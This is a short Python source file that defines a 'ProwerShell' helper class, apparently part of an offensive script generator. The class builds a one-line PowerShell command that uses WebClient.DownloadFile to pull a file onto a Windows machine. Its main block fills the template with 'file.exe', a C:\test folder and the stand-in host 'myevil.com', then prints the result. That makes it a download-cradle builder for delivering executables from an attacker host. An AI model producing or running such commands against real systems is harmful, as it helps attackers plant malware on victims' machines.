from copy_script.Scripter import Scripter


class ProwerShell(Scripter):
    cmd = ["powershell -c \"(new-object System.Net.WebClient).DownloadFile('<URL>','<TARGET_FILE>')\""]


if __name__ == "__main__":
    script = ProwerShell(file_name="file.exe", destination_directory="C:\\\\test\\", url="myevil.com")
    print script.get_one_line_script()
